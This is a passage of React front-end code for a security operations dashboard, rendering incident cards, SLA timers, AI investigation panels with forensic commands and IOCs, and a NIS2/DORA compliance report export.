                    <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:10}}>
                      <span style={{fontSize:'0.84rem',fontWeight:700,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.5px'}}>Analyst Workload</span>
                      {analystFilter && <button onClick={()=>setAnalystFilter(null)} style={{fontSize:'0.82rem',padding:'1px 8px',borderRadius:4,border:'1px solid #4f8fff30',background:'#4f8fff10',color:'#4f8fff',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Showing: {analystFilter} ×</button>}
                    </div>
                    <div style={{display:'flex',gap:8,flexWrap:'wrap'}}>
                      {entries.map(([name,stats])=>{
                        const initials = name.split(' ').map(n=>n[0]).join('').slice(0,2).toUpperCase();
                        const load = stats.active + stats.escalated;
                        const loadColor = load>=3?'#f0405e':load>=2?'#f97316':load>=1?'#f0a030':'#22d49a';
                        const isFiltered = analystFilter === name;
                        return (
                          <div key={name} onClick={()=>setAnalystFilter(isFiltered?null:name)} style={{display:'flex',alignItems:'center',gap:8,padding:'8px 12px',background:isFiltered?`${loadColor}15`:'var(--wt-card2)',border:`1px solid ${isFiltered?loadColor:loadColor+'20'}`,borderRadius:8,minWidth:160,cursor:'pointer',transition:'all .15s'}}>
                            <div style={{width:28,height:28,borderRadius:'50%',background:`linear-gradient(135deg,${loadColor}30,${loadColor}10)`,border:`1px solid ${loadColor}40`,display:'flex',alignItems:'center',justifyContent:'center',fontSize:'0.84rem',fontWeight:800,color:loadColor,flexShrink:0}}>{initials}</div>
                            <div style={{flex:1,minWidth:0}}>
                              <div style={{fontSize:'0.86rem',fontWeight:700,overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{name.split(' ')[0]}</div>
                              <div style={{display:'flex',gap:4,marginTop:2,flexWrap:'wrap'}}>
                                {stats.active>0&&<span style={{fontSize:'0.84rem',fontWeight:700,padding:'0 4px',borderRadius:2,background:'#f0405e18',color:'#f0405e'}}>{stats.active} active</span>}
                                {stats.escalated>0&&<span style={{fontSize:'0.84rem',fontWeight:700,padding:'0 4px',borderRadius:2,background:'#8b6fff18',color:'#8b6fff'}}>{stats.escalated} escalated</span>}
                                {stats.contained>0&&<span style={{fontSize:'0.84rem',fontWeight:700,padding:'0 4px',borderRadius:2,background:'#f0a03018',color:'#f0a030'}}>{stats.contained} contained</span>}
                                {stats.resolved>0&&<span style={{fontSize:'0.84rem',fontWeight:700,padding:'0 4px',borderRadius:2,background:'#22d49a18',color:'#22d49a'}}>{stats.resolved} resolved</span>}
                              </div>
                            </div>
                            <div style={{fontSize:'1.2rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:loadColor,lineHeight:1}}>{stats.total}</div>
                          </div>
                        );
                      })}
                    </div>
                  </div>
                );
              })()}
              {incidents.filter(inc=>!deletedIncidents.has(inc.id)&&(!analystFilter||(inc.assignedTo||'')===(analystFilter))).map(inc=>{
                const isSel = selectedIncident?.id===inc.id;
                const incStatus = incidentStatuses[inc.id] || inc.status; const statusColor = incStatus==='Active'?'#f0405e':incStatus==='Contained'?'#f0a030':'#22d49a';
                return (
                  <div key={inc.id} style={{background:'var(--wt-card)',border:`1px solid ${isSel?'#4f8fff40':'var(--wt-border)'}`,borderRadius:12,overflow:'hidden'}}>
                    <div style={{padding:'12px 16px',cursor:'pointer',display:'flex',alignItems:'flex-start',gap:12}} onClick={()=>setSelectedIncident(isSel?null:inc)}>
                      <div style={{flex:1}}>
                        <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:4}}>
                          <span style={{fontSize:'0.86rem',fontWeight:800,color:'#4f8fff',fontFamily:'JetBrains Mono,monospace'}}>{inc.id}</span>
                          <span style={{fontSize:'0.84rem',fontWeight:700,padding:'2px 7px',borderRadius:3,background:`${statusColor}15`,color:statusColor,border:`1px solid ${statusColor}25`}}>{incStatus.toUpperCase()}</span>
                          <SevBadge sev={inc.severity} />
                          {(()=>{
                            void slaTick;
                            const slaMin={Critical:60,High:240,Medium:1440,Low:4320}[inc.severity]||1440;
                            const parts=inc.created.split(' ');
                            const [datePart,timePart]=parts.length===2?parts:['2026-03-27',parts[0]];
                            const created=new Date(datePart+'T'+timePart+':00');
                            const elapsed=Math.floor((Date.now()-created.getTime())/60000);
                            const remaining=slaMin-elapsed;
                            const pct=Math.min(100,Math.max(0,(elapsed/slaMin)*100));
                            const color=remaining<0?'#f0405e':pct>75?'#f97316':pct>50?'#f0a030':'#22d49a';
                            const label=remaining<0?`SLA BREACHED ${Math.abs(Math.floor(remaining/60))}h ago`:remaining<60?`${remaining}m left`:`${Math.floor(remaining/60)}h ${remaining%60}m left`;
                            return <span style={{fontSize:'0.58rem',fontWeight:800,padding:'1px 6px',borderRadius:3,background:`${color}15`,color,border:`1px solid ${color}25`,flexShrink:0}}>{label}</span>;
                          })()}
                        </div>
                        <div style={{fontSize:'0.84rem',fontWeight:700,marginBottom:4}}>{inc.title}</div>
                        <div style={{display:'flex',gap:8,flexWrap:'wrap',alignItems:'center'}}>
                          {(inc.mitreTactics||[]).map(t=><span key={t} style={{fontSize:'0.84rem',color:'#7c6aff',fontFamily:'JetBrains Mono,monospace'}}>{t}</span>)}
                          <span style={{fontSize:'0.82rem',color:'var(--wt-dim)'}}>{inc.alertCount} alert{inc.alertCount!==1?'s':''} · {(inc.devices||[]).length} device{(inc.devices||[]).length!==1?'s':''}</span>
                          <span style={{fontSize:'0.82rem',color:'var(--wt-dim)'}}>Updated {inc.updated&&inc.updated.split&&inc.updated.split(' ')[1]||'—'}</span>
                          {inc.assignedTo && <span style={{fontSize:'0.86rem',fontWeight:700,padding:'1px 6px',borderRadius:3,background:'#4f8fff12',color:'#4f8fff',border:'1px solid #4f8fff25',flexShrink:0}}>{'\u{1f464}'} {inc.assignedTo.split(' ')[0]}</span>}
                          {(()=>{
                            if(!inc.created||(incidentStatuses[inc.id]||inc.status)!=='Active') return null;
                            const ageMs=Date.now()-new Date(inc.created).getTime();
                            const slaSec=inc.severity==='Critical'?3600:inc.severity==='High'?14400:86400;
                            const remainMs=slaSec*1000-ageMs;
                            const breached=remainMs<0;
                            const h=Math.floor(Math.abs(remainMs)/3600000);
                            const m=Math.floor((Math.abs(remainMs)%3600000)/60000);
                            const label=breached?`SLA breached ${h}h${m}m ago`:`SLA ${h}h${m}m remaining`;
                            return <span style={{fontSize:'0.8rem',fontWeight:700,padding:'1px 6px',borderRadius:3,background:breached?'#f0405e':'#f0a03012',color:breached?'#fff':'#f0a030',border:breached?'none':'1px solid #f0a03030'}}>{label}</span>;
                          })()}
                        </div>
                      </div>
                      <div style={{display:'flex',alignItems:'center',gap:4,flexShrink:0}}>
                        {incidentAssignees&&incidentAssignees[inc.id]&&<span style={{fontSize:'0.84rem',fontWeight:700,padding:'1px 5px',borderRadius:3,background:'#4f8fff18',color:'#4f8fff',border:'1px solid #4f8fff25'}}>→ {incidentAssignees[inc.id]}</span>}
                        <button onClick={e=>{e.stopPropagation();setIncidentAssignees(prev=>({...prev,[inc.id]:prev[inc.id]?null:'Me'}));}} style={{fontSize:'0.84rem',padding:'2px 7px',borderRadius:4,border:`1px solid ${incidentAssignees&&incidentAssignees[inc.id]?'#4f8fff40':'var(--wt-border2)'}`,background:incidentAssignees&&incidentAssignees[inc.id]?'#4f8fff15':'transparent',color:incidentAssignees&&incidentAssignees[inc.id]?'#4f8fff':'var(--wt-dim)',cursor:'pointer',fontFamily:'Inter,sans-serif',fontWeight:700}}>{incidentAssignees&&incidentAssignees[inc.id]?'✓ Me':'Assign'}</button>
                        <span style={{fontSize:'0.86rem',color:'var(--wt-dim)'}}>{isSel?'▲':'▼'}</span>
                      </div>
                    </div>
                    {isSel && (
                      <div style={{borderTop:'1px solid #1d2535',padding:'14px 16px'}}>
                        <GateWall feature='AI Attack Narrative' requiredTier='team' userTier={userTier} isAdmin={isAdmin}>
              <div style={{fontSize:'0.82rem',color:'var(--wt-secondary)',lineHeight:1.65,padding:'10px',background:'linear-gradient(135deg,rgba(79,143,255,0.04),rgba(34,201,146,0.04))',border:'1px solid #4f8fff15',borderRadius:8,marginBottom:12}}>
                          <span style={{fontSize:'0.84rem',fontWeight:700,color:'#4f8fff',display:'block',marginBottom:4}}>AI ATTACK NARRATIVE</span>
                          {inc.aiSummary}
                        </div>
                        </GateWall>
                        <div style={{fontSize:'0.86rem',fontWeight:700,color:'var(--wt-dim)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:8}}>Attack Timeline</div>
                        <div style={{display:'flex',flexDirection:'column',gap:0}}>
                          {(inc.timeline||[]).map((event,i)=>(
                            <div key={i} style={{display:'flex',gap:0,padding:'5px 0'}}>
                              <div style={{display:'flex',flexDirection:'column',alignItems:'center',minWidth:50}}>
                                <span style={{fontSize:'0.84rem',fontFamily:'JetBrains Mono,monospace',color:'var(--wt-dim)',marginBottom:3}}>{event.t}</span>
                                <div style={{width:8,height:8,borderRadius:'50%',background:event.actor==='AI'?'#4f8fff':'#22d49a',flexShrink:0}} />
                                {i<(inc.timeline||[]).length-1&&<div style={{width:1,flex:1,background:'var(--wt-border)',minHeight:16,marginTop:2}} />}
                              </div>
                              <div style={{flex:1,paddingLeft:10,paddingBottom:8}}>
                                <div style={{display:'flex',alignItems:'center',gap:6,marginBottom:1}}>
                                  <span style={{fontSize:'0.84rem',fontWeight:700,padding:'1px 5px',borderRadius:3,background:event.actor==='AI'?'#4f8fff15':'#22d49a15',color:event.actor==='AI'?'#4f8fff':'#22d49a'}}>{event.actor}</span>
                                  <span style={{fontSize:'0.82rem',fontWeight:600}}>{event.action}</span>
                                </div>
                                <div style={{fontSize:'0.84rem',color:'var(--wt-muted)',lineHeight:1.5}}>{event.detail}</div>
                              </div>
                            </div>
                          ))}
                        </div>
                        {/* AI Commands Run — extracted from AI-actor timeline entries */}
                        {(inc.timeline||[]).filter(e=>e.actor==='AI'&&e.cmd).length>0&&(
                          <div style={{marginTop:12,padding:'10px 12px',background:'#060b10',border:'1px solid #4f8fff20',borderRadius:8}}>
                            <div style={{fontSize:'0.84rem',fontWeight:700,color:'#4f8fff',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:8,display:'flex',alignItems:'center',gap:6}}>
                              <span style={{width:6,height:6,borderRadius:'50%',background:'#4f8fff',display:'block'}} />AI Commands Executed
                              <span style={{fontSize:'0.84rem',color:'var(--wt-dim)',fontWeight:400,marginLeft:4}}>automated responses run by Watchtower AI</span>
                            </div>
                            <div style={{display:'flex',flexDirection:'column',gap:4}}>
                              {(inc.timeline||[]).filter(e=>e.actor==='AI'&&e.cmd).map((e,ci)=>(
                                <div key={ci} style={{display:'flex',gap:8,alignItems:'flex-start'}}>
                                  <span style={{fontSize:'0.84rem',fontFamily:'JetBrains Mono,monospace',color:'#4f8fff',flexShrink:0,marginTop:3,minWidth:36}}>{e.t}</span>
                                  <div style={{flex:1}}>
                                    <div style={{fontSize:'0.84rem',color:'var(--wt-secondary)',marginBottom:2}}>{e.action}</div>
                                    <div style={{padding:'4px 8px',background:'#0d1520',border:'1px solid #1a2535',borderRadius:4,fontSize:'0.84rem',fontFamily:'JetBrains Mono,monospace',color:'#22d49a',wordBreak:'break-all',whiteSpace:'pre-wrap',lineHeight:1.6}}>{e.cmd}</div>
                                  </div>
                                  <button onClick={()=>navigator.clipboard.writeText(e.cmd)} style={{padding:'2px 6px',borderRadius:3,border:'1px solid #1d2535',background:'transparent',color:'var(--wt-dim)',fontSize:'0.84rem',cursor:'pointer',fontFamily:'Inter,sans-serif',flexShrink:0,marginTop:3}}>Copy</button>
                                </div>
                              ))}
                            </div>
                          </div>
                        )}
                        <div style={{display:'flex',gap:6,marginTop:10,flexWrap:'wrap',alignItems:'center',position:'relative'}}>
                          <button onClick={()=>setAddingNoteTo(addingNoteTo===inc.id?null:inc.id)} style={{padding:'5px 12px',borderRadius:6,border:'1px solid var(--wt-border2)',background:addingNoteTo===inc.id?'#4f8fff12':'transparent',color:'#8a9ab0',fontSize:'0.84rem',fontWeight:600,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>📝 Note</button>
                          {canUse('team')&&<button onClick={()=>{const si=showInvest;const n=new Set(si);if(!n.has(inc.id)){n.add(inc.id);setShowInvest(n);runInvestigation(inc);}else{n.delete(inc.id);setShowInvest(n);}}} style={{padding:'5px 12px',borderRadius:6,border:`1px solid ${showInvest.has(inc.id)?'#8b6fff':'#8b6fff30'}`,background:showInvest.has(inc.id)?'#8b6fff20':'#8b6fff0a',color:'#8b6fff',fontSize:'0.84rem',fontWeight:600,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>✦ {investLoading.has(inc.id)?'Investigating…':investResults[inc.id]&&!investResults[inc.id]._error?'Investigation ▲':'Deep Investigate'}</button>}
                          <button onClick={()=>setIncidentStatuses(prev=>({...prev,[inc.id]:'Escalated'}))} style={{padding:'5px 12px',borderRadius:6,border:'1px solid #f0a03030',background:'#f0a03008',color:'#f0a030',fontSize:'0.84rem',fontWeight:600,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>⬆ Escalate</button>
                          <button onClick={()=>closeIncident(inc.id)} style={{padding:'5px 12px',borderRadius:6,border:'1px solid #22d49a30',background:'#22d49a0a',color:'#22d49a',fontSize:'0.84rem',fontWeight:600,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>✓ Close</button>
                          {/* Assign to me */}
                          <button onClick={()=>setCreatedIncidents(prev=>prev.map(i=>i.id===inc.id?{...i,assignedTo:currentUserName||'Me'}:i))} style={{padding:'5px 12px',borderRadius:6,border:'1px solid #4f8fff30',background:'#4f8fff08',color:'#4f8fff',fontSize:'0.84rem',fontWeight:600,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>👤 Assign to me</button>
                          {/* Assign to analyst dropdown */}
                          {(()=>{
                            // Live: pull from staffUsers (Redis); demo: derive from demo incident assignedTo
                            const baseAnalysts = demoMode
                              ? [...new Set(incidents.map(i=>i.assignedTo).filter(Boolean))]
                              : staffUsers.length > 0
                                ? staffUsers.filter(u=>u.status==='Active'||u.status==='active').map(u=>u.name).filter(Boolean)
                                : [...new Set(createdIncidents.map(i=>i.assignedTo).filter(Boolean))];
                            const allAnalysts=[...new Set([...baseAnalysts,...(!demoMode&&staffUsers.length>0?[]:[])])].filter(Boolean);
                            return (
                              <div style={{position:'relative'}}>
                                <button onClick={e=>{e.stopPropagation();setAssignDropdown(assignDropdown===inc.id?null:inc.id);}} style={{padding:'5px 12px',borderRadius:6,border:'1px solid #8b6fff30',background:'#8b6fff08',color:'#8b6fff',fontSize:'0.84rem',fontWeight:600,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Assign ▾</button>
                                {assignDropdown===inc.id && (
                                  <div onClick={e=>e.stopPropagation()} style={{position:'absolute',bottom:'100%',left:0,marginBottom:4,background:'var(--wt-sidebar)',border:'1px solid #1d2535',borderRadius:8,boxShadow:'0 4px 20px rgba(0,0,0,0.5)',zIndex:200,minWidth:160,padding:4}}>
                                    {allAnalysts.map(name=>(
                                      <button key={name} onClick={()=>{setCreatedIncidents(prev=>prev.map(i=>i.id===inc.id?{...i,assignedTo:name}:i));setAssignDropdown(null);}} style={{display:'block',width:'100%',padding:'7px 12px',border:'none',borderRadius:5,background:inc.assignedTo===name?'#4f8fff18':'transparent',color:inc.assignedTo===name?'#4f8fff':'var(--wt-secondary)',fontSize:'0.8rem',fontWeight:inc.assignedTo===name?700:400,cursor:'pointer',fontFamily:'Inter,sans-serif',textAlign:'left'}}>
                                        {inc.assignedTo===name?'✓ ':''}{name}
                                      </button>
                                    ))}
                                  </div>
                                )}
                              </div>
                            );
                          })()}
                          <button onClick={()=>deleteIncident(inc.id)} style={{padding:'5px 12px',borderRadius:6,border:'1px solid #f0405e25',background:'#f0405e0a',color:'#f0405e',fontSize:'0.84rem',fontWeight:600,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>🗑</button>
                          {inc.alerts&&inc.alerts.length>0&&<button onClick={()=>{setAlertSevFilter('all');setAlertSearch('');inc.alerts.forEach(id=>setExpandedAlerts(prev=>{const n=new Set(prev);n.add(id);return n;}));setActiveTab('alerts');}} style={{padding:'5px 12px',borderRadius:6,border:'1px solid #4f8fff30',background:'#4f8fff08',color:'#4f8fff',fontSize:'0.84rem',fontWeight:600,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>🔗 Alerts</button>}
                        </div>
                        {addingNoteTo===inc.id && (
                          <div style={{marginTop:8,display:'flex',gap:6}}>
                            <input value={noteInput} onChange={e=>setNoteInput(e.target.value)} placeholder='Type a note...' style={{flex:1,padding:'6px 10px',borderRadius:6,border:'1px solid var(--wt-border2)',background:'var(--wt-card)',color:'var(--wt-text)',fontSize:'0.82rem',fontFamily:'Inter,sans-serif',outline:'none'}} />
                            <button onClick={()=>{if(noteInput.trim()){setIncidentNotes(prev=>({...prev,[inc.id]:[...(prev[inc.id]||[]),{text:noteInput.trim(),time:new Date().toLocaleTimeString()}]}));setNoteInput('');setAddingNoteTo(null);}}} style={{padding:'6px 12px',borderRadius:6,border:'none',background:'#4f8fff',color:'#fff',fontSize:'0.86rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Save</button>
                          </div>
                        )}
                        {incidentNotes[inc.id] && incidentNotes[inc.id].length>0 && (
                          <div style={{marginTop:8}}>
                            <div style={{fontSize:'0.84rem',fontWeight:700,color:'var(--wt-dim)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:4}}>Notes</div>
                            {incidentNotes[inc.id].map((n,ni)=>(
                              <div key={ni} style={{fontSize:'0.86rem',color:'var(--wt-secondary)',padding:'5px 8px',background:'var(--wt-card2)',borderRadius:5,marginBottom:3,display:'flex',justifyContent:'space-between',gap:8}}>
                                <span>{n.text}</span><span style={{color:'var(--wt-dim)',flexShrink:0,fontSize:'0.84rem'}}>{n.time}</span>
                              </div>
                            ))}
                          </div>
                        )}
                        {/* DEEP INVESTIGATION PANEL */}
                        {showInvest.has(inc.id) && (
                          <div style={{marginTop:14,background:'linear-gradient(135deg,rgba(139,111,255,0.05),rgba(79,143,255,0.03))',border:'1px solid #8b6fff25',borderRadius:12,overflow:'hidden'}}>
                            <div style={{padding:'10px 14px',borderBottom:'1px solid #8b6fff15',display:'flex',alignItems:'center',gap:8}}>
                              <span style={{fontSize:'0.8rem',fontWeight:800,color:'#8b6fff',letterSpacing:'0.5px'}}>✦ TIER 2/3 DEEP INVESTIGATION</span>
                              {investResults[inc.id] && <span style={{fontSize:'0.8rem',color:'var(--wt-muted)',marginLeft:'auto'}}>AI-generated · verify with your tools</span>}
                            </div>
                            {investLoading.has(inc.id) && <div style={{padding:'14px',fontSize:'0.8rem',color:'var(--wt-muted)',display:'flex',alignItems:'center',gap:8}}><span style={{width:10,height:10,borderRadius:'50%',border:'2px solid #8b6fff',borderTopColor:'transparent',display:'block',animation:'spin 0.8s linear infinite'}}/>Running deep investigation…</div>}
                            {investResults[inc.id]?._error && <div style={{padding:'12px 14px',background:'#f0405e08',border:'1px solid #f0405e25',borderRadius:8,display:'flex',alignItems:'center',gap:8}}><span style={{color:'#f0405e',fontSize:'0.8rem'}}>⚠</span><div><div style={{fontSize:'0.8rem',color:'#f0405e',fontWeight:600,marginBottom:2}}>Investigation failed</div><div style={{fontSize:'0.84rem',color:'var(--wt-muted)'}}>{investResults[inc.id]._error}</div></div><button onClick={()=>{setInvestResults(prev=>{const n={...prev};delete n[inc.id];return n;});runInvestigation(inc);}} style={{marginLeft:'auto',padding:'4px 12px',borderRadius:6,border:'1px solid #8b6fff30',background:'#8b6fff10',color:'#8b6fff',fontSize:'0.82rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif',flexShrink:0}}>↺ Retry</button></div>}
                            {investResults[inc.id] && !investResults[inc.id]._error && (()=>{const inv=investResults[inc.id];return(
                              <div style={{padding:'14px',display:'flex',flexDirection:'column',gap:14}}>
                                {inv.rootCause&&<div style={{marginBottom:10}}><div style={{fontSize:'0.72rem',fontWeight:800,color:'#f0405e',textTransform:'uppercase',letterSpacing:'1px',marginBottom:6}}>Root Cause</div><div style={{padding:'10px 12px',background:'rgba(240,64,94,0.04)',border:'1px solid rgba(240,64,94,0.12)',borderRadius:7}}><WtMarkdown text={inv.rootCause} accent='#f0405e' compact={true} /></div></div>}
                                {inv.attackerObjective&&<div style={{marginBottom:10,padding:'10px 12px',background:'#f9731608',border:'1px solid #f9731620',borderRadius:7,display:'flex',gap:8,alignItems:'flex-start'}}><span style={{fontSize:'1rem',flexShrink:0}}>🎯</span><div><div style={{fontSize:'0.72rem',fontWeight:800,color:'#f97316',textTransform:'uppercase',letterSpacing:'1px',marginBottom:3}}>Attacker Objective</div><div style={{fontSize:'0.84rem',color:'#f97316',lineHeight:1.6}}>{inv.attackerObjective}</div></div></div>}
                                {inv.affectedScope&&<div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:8}}><div><div style={{fontSize:'0.8rem',fontWeight:700,color:'var(--wt-muted)',textTransform:'uppercase',marginBottom:4}}>Users at Risk</div>{(inv.affectedScope.users||[]).map((u,i)=><div key={i} style={{fontSize:'0.8rem',color:'var(--wt-secondary)',marginBottom:1}}>👤 {u}</div>)}</div><div><div style={{fontSize:'0.8rem',fontWeight:700,color:'var(--wt-muted)',textTransform:'uppercase',marginBottom:4}}>Devices at Risk</div>{(inv.affectedScope.devices||[]).map((d,i)=><div key={i} style={{fontSize:'0.8rem',color:'var(--wt-secondary)',marginBottom:1}}>💻 {d}</div>)}</div></div>}
                                {inv.attackTimeline?.length>0&&<div><div style={{fontSize:'0.8rem',fontWeight:700,color:'#4f8fff',textTransform:'uppercase',marginBottom:6}}>Reconstructed Timeline</div>{inv.attackTimeline.map((ev,i)=>(<div key={i} style={{display:'flex',gap:8,padding:'5px 0',borderBottom:'1px solid var(--wt-border)',alignItems:'flex-start'}}><span style={{fontSize:'0.84rem',fontFamily:'JetBrains Mono,monospace',color:'#4f8fff',flexShrink:0,minWidth:36}}>{ev.time}</span><div style={{flex:1}}><div style={{fontSize:'0.82rem',fontWeight:600,color:'var(--wt-text)',marginBottom:1}}>{ev.event}</div><div style={{fontSize:'0.84rem',color:'var(--wt-dim)'}}>{ev.significance}</div></div><span style={{fontSize:'0.84rem',color:'#4f8fff',fontWeight:700,flexShrink:0,padding:'1px 5px',background:'#4f8fff12',borderRadius:3}}>{ev.source}</span></div>))}</div>}
                                {inv.lateralMovementPaths?.length>0&&<div><div style={{fontSize:'0.8rem',fontWeight:700,color:'#f97316',textTransform:'uppercase',marginBottom:4}}>Lateral Movement Paths</div>{inv.lateralMovementPaths.map((path,i)=><div key={i} style={{fontSize:'0.8rem',color:'#f97316',marginBottom:2}}>→ {path}</div>)}</div>}
                                {inv.remediationSteps?.length>0&&<div><div style={{fontSize:'0.8rem',fontWeight:700,color:'#22d49a',textTransform:'uppercase',marginBottom:6}}>Remediation Plan</div>{inv.remediationSteps.map((s,i)=>{const pc=s.priority==='Critical'?'#f0405e':s.priority==='High'?'#f97316':'#f0a030';return(<div key={i} style={{display:'flex',gap:8,padding:'5px 8px',background:`${pc}08`,borderRadius:6,border:`1px solid ${pc}20`,marginBottom:4}}><span style={{fontSize:'0.84rem',fontWeight:700,color:pc,padding:'1px 5px',background:`${pc}15`,borderRadius:3,flexShrink:0,marginTop:2}}>{s.priority}</span><div><div style={{fontSize:'0.82rem',color:'var(--wt-text)',fontWeight:600}}>{s.action}</div><div style={{fontSize:'0.82rem',color:'var(--wt-dim)'}}>Owner: {s.owner}</div></div></div>);})}</div>}
                                {inv.forensicCommands?.length>0&&<div><div style={{fontSize:'0.8rem',fontWeight:700,color:'#4f8fff',textTransform:'uppercase',marginBottom:6}}>Forensic Commands</div>{inv.forensicCommands.map((fc,i)=>(<div key={i} style={{marginBottom:8}}><div style={{display:'flex',justifyContent:'space-between',marginBottom:2}}><span style={{fontSize:'0.8rem',color:'var(--wt-dim)',fontWeight:700}}>{fc.tool} — {fc.purpose}</span><button onClick={()=>navigator.clipboard?.writeText(fc.command)} style={{padding:'2px 7px',borderRadius:3,border:'1px solid #4f8fff30',background:'#4f8fff12',color:'#4f8fff',fontSize:'0.84rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Copy</button></div><code style={{display:'block',fontSize:'0.84rem',fontFamily:'JetBrains Mono,monospace',color:'#22c992',background:'#050810',padding:'6px 8px',borderRadius:5,wordBreak:'break-all',lineHeight:1.5}}>{fc.command}</code></div>))}</div>}
                                {inv.iocs?.length>0&&<div><div style={{fontSize:'0.8rem',fontWeight:700,color:'#f0a030',textTransform:'uppercase',marginBottom:4}}>Extracted IOCs</div><div style={{display:'flex',flexWrap:'wrap',gap:4}}>{inv.iocs.map((ioc,i)=>(<span key={i} style={{fontSize:'0.86rem',fontFamily:'JetBrains Mono,monospace',padding:'2px 7px',background:'#f0a03010',border:'1px solid #f0a03025',borderRadius:4,color:'#f0a030'}}>{ioc}</span>))}</div></div>}
                                {inv.detectionGaps?.length>0&&<div><div style={{fontSize:'0.8rem',fontWeight:700,color:'var(--wt-muted)',textTransform:'uppercase',marginBottom:4}}>Detection Gaps Found</div>{inv.detectionGaps.map((g,i)=><div key={i} style={{fontSize:'0.86rem',color:'var(--wt-muted)',marginBottom:2}}>⚠️ {g}</div>)}</div>}
                              </div>
                            );})()}
                          </div>
                        )}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          </GateWall>
          )}
          {/* COMPLIANCE tab now accessible via admin only — hidden from main nav */}
          {activeTab==='compliance' && (
            <GateWall feature='Compliance Mapping' requiredTier='business' userTier={userTier} isAdmin={isAdmin}>
            <div style={{display:'flex',flexDirection:'column',gap:16,width:'100%'}}>
              <div style={{display:'flex',alignItems:'center',gap:10,marginBottom:4,flexWrap:'wrap'}}>
                <h2 style={{fontSize:'0.88rem',fontWeight:700}}>Compliance Mapping</h2>
                <span style={{fontSize:'0.86rem',color:'#4f8fff',background:'#4f8fff12',padding:'2px 8px',borderRadius:4}}>MITRE ATT&amp;CK → ISO 27001 · Cyber Essentials · NIST CSF</span>
                <span style={{fontSize:'0.86rem',color:'#8b6fff',background:'#8b6fff12',padding:'2px 8px',borderRadius:4,border:'1px solid #8b6fff20'}}>NIS2 · DORA</span>
                <div style={{marginLeft:'auto',display:'flex',gap:6}}>
                  <button onClick={()=>{
                    const mitreTechs=[...new Set(alerts.filter(a=>a.mitre).map(a=>a.mitre))];
                    const lines=[
                      'WATCHTOWER REGULATORY COMPLIANCE REPORT',
                      `Generated: ${new Date().toISOString()}`,
                      `Period: Last 30 days`,
                      '',
                      '=== NIS2 DIRECTIVE (EU) 2022/2555 ===',
                      'Art. 21 — Cybersecurity risk management:',
                      `  MITRE techniques detected: ${mitreTechs.join(', ')||'None'}`,
                      `  Incidents logged: ${incidents.length}`,
                      `  Detection tools active: ${activeTools.length}`,
                      `  Alert coverage: ${alerts.length} alerts processed`,
                      '',
                      '=== DORA — Digital Operational Resilience Act ===',
                      'Art. 10 — ICT-related incident classification:',
                      `  Critical alerts: ${critAlerts.length}`,
                      `  Mean time to triage: <3.2 seconds (AI-assisted)`,
                      `  Incidents with full audit trail: ${incidents.length}`,
                      '',
                      '=== ISO 27001:2022 CONTROL COVERAGE ===',
                      ...mitreTechs.slice(0,10).map(t=>`  ${t} — documented in incident log`),
                      '',
                      '=== CYBER ESSENTIALS ===',
                      `  Estate coverage: ${coveredPct}%`,
                      `  Tools active: ${activeTools.map(t=>t.name).join(', ')||'None'}`,
                      '',
                      '=== NIST CSF v2.0 ===',
                      `  Identify: ${alerts.length} assets monitored`,
                      `  Detect: ${activeTools.length} detection tools`,
                      `  Respond: ${incidents.filter(i=>i.status==='Resolved').length} incidents resolved`,
                      '',
                      'Report generated by Watchtower SOC Platform — getwatchtower.io',
                    ];
                    const blob=new Blob([lines.join('\n')],{type:'text/plain'});
                    const url=URL.createObjectURL(blob);
                    const a=document.createElement('a');a.href=url;a.download=`watchtower-regulatory-report-${new Date().toISOString().split('T')[0]}.txt`;a.click();URL.revokeObjectURL(url);
                  }} style={{padding:'5px 14px',borderRadius:7,border:'1px solid #8b6fff30',background:'#8b6fff12',color:'#8b6fff',fontSize:'0.84rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>
                    📄 NIS2/DORA Export
                  </button>
                  <button onClick={async()=>{
                    const w=window.open('','_blank');if(!w)return;
                    w.document.write('<html><body style="background:#050508;color:#e8ecf4;font-family:Inter;display:flex;align-items:center;justify-content:center;height:100vh">Generating compliance report…</body></html>');
                    try{
                      const r=await fetch('/api/exec-summary',{method:'POST',headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current,'x-is-admin':isAdmin?'true':'false','x-user-tier':userTier},body:JSON.stringify({org:'Watchtower SOC',period:'Last 30 days',totalAlerts,critAlerts:critAlerts.length,openCases,closedCases:incidents.filter(i=>(incidentStatuses[i.id]||i.status)==='Resolved').length,slaBreaches,fpsClosed:fpAlerts.length,tpConfirmed:tpAlerts.length,posture,coverage:coveredPct,tools:Object.keys(connectedTools).length,topAlerts:critAlerts.slice(0,5).map(a=>a.title),topVulns:vulns.slice(0,3).map(v=>v.title)})});
                      const d=await r.json();if(d.html&&w){w.document.open();w.document.write(d.html);w.document.close();setTimeout(()=>w.print(),500);}else if(!d.ok&&w){w.document.open();w.document.write('<html><body style="font-family:sans-serif;padding:40px;color:#333"><h2>Report generation failed</h2><p>'+((d.error||'Check your Anthropic API key in the Tools tab.').replace(/</g,'&lt;').replace(/>/g,'&gt;'))+'</p></body></html>');w.document.close();}
                    }catch(e){if(w)w.close();}
